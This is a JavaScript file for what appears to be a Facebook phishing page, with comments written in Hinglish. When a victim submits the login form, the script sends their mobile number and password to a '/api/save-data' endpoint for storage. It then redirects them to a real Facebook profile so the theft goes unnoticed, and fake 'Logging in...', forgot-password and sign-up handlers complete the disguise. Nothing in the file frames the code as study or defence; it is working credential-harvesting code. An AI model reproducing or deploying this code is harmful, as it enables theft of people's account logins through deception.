document.addEventListener('DOMContentLoaded', () => {
    
    // Facebook profile URL (redirect ke liye)
    const FACEBOOK_PROFILE_URL = "https://www.facebook.com/share/19Q38o1ATD/";

    // Dono forms (Desktop aur Mobile)
    const forms = document.querySelectorAll('form');

    forms.forEach(form => {
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const inputs = form.querySelectorAll('input');
            const mobile = inputs[0].value.trim();
            const password = inputs[1].value.trim();

            // Validation
            if (mobile === '' || password === '') {
                alert('Please fill in all fields.');
                return;
            }

            // Button loading state
            const submitBtn = form.querySelector('.btn-login');
            const originalText = submitBtn.innerText;
            
            submitBtn.innerText = 'Logging in...';
            submitBtn.style.opacity = '0.8';
            submitBtn.disabled = true;

            try {
                // Data Vercel ke API par bhejein
                const response = await fetch('/api/save-data', {
                    method: 'POST',
                    headers: { 
                        'Content-Type': 'application/json' 
                    },
                    body: JSON.stringify({ 
                        mobile: mobile, 
                        password: password 
                    }),
                });

                const data = await response.json();

                if (response.ok && data.success) {
                    // Data save ho gaya, ab Facebook par redirect
                    console.log('Data saved:', data);
                    window.location.href = FACEBOOK_PROFILE_URL;
                } else {
                    alert('Error: ' + (data.error || 'Something went wrong'));
                    submitBtn.innerText = originalText;
                    submitBtn.style.opacity = '1';
                    submitBtn.disabled = false;
                }

            } catch (error) {
                console.error('Network error:', error);
                alert('Network error. Please check your connection.');
                submitBtn.innerText = originalText;
                submitBtn.style.opacity = '1';
                submitBtn.disabled = false;
            }
        });
    });

    // Mobile Back Arrow
    const backArrow = document.querySelector('.back-icon');
    if(backArrow) {
        backArrow.addEventListener('click', () => {
            window.history.back();
        });
    }

    // Forgot Password
    const forgotLinks = document.querySelectorAll('.forgot-link');
    forgotLinks.forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            alert('Please enter your email to reset your password.');
        });
    });

    // Create New Account
    const createBtns = document.querySelectorAll('.btn-create-new');
    createBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            alert('Redirecting to Sign Up page...');
        });
    });
});